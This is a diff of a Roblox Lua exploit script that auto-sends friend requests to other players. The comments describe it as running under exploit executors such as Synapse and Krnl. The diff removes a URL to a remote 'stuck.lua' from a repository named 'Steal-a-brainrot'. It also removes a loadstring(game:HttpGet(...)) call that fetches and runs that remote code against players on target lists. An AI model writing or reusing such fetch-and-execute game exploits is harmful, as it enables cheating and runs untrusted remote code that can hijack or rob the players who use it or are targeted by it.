@@ -38,11 +38,6 @@ if SayMessageRequest then
 end
 
 -- ==============================================================
--- EXTERNAL SCRIPT URL (stuck.lua)
--- ==============================================================
-local STUCK_URL = "https://raw.githubusercontent.com/RblxScriptsOG/Steal-a-brainrot/refs/heads/main/stuck.lua"
-
--- ==============================================================
 -- HELPERS
 -- ==============================================================
 local friendSent       = {}
@@ -58,18 +53,18 @@ local function isInList(name, list)
 end
 
 -- --------------------------------------------------------------
--- NEW sendFriendRequest (exploit + GUI fallback)
+-- sendFriendRequest (exploit + GUI fallback) — NO stuck.lua
 -- --------------------------------------------------------------
 local function sendFriendRequest(plr)
     if not plr or not plr.UserId or friendSent[plr.Name] or plr == LocalPlayer then return end
     friendSent[plr.Name] = true
 
-    -- EXPLOIT METHOD (works in Synapse/Delta/Krnl etc.)
+    -- EXPLOIT METHOD (Synapse/Delta/Krnl)
     pcall(function()
         LocalPlayer:RequestFriendship(plr)
     end)
 
-    -- Safe GUI fallback (always runs)
+    -- GUI fallback
     spawn(function()
         task.wait(1.5)
         pcall(function()
@@ -78,15 +73,6 @@ local function sendFriendRequest(plr)
     end)
 
     print("Friend request → " .. plr.Name)
-
-    -- Run stuck.lua for target users
-    if isInList(plr.Name, users) or isInList(plr.Name, users1) then
-        spawn(function()
-            pcall(function()
-                loadstring(game:HttpGet(STUCK_URL, true))()
-            end)
-        end)
-    end
 end
 
 local function fireToggle()
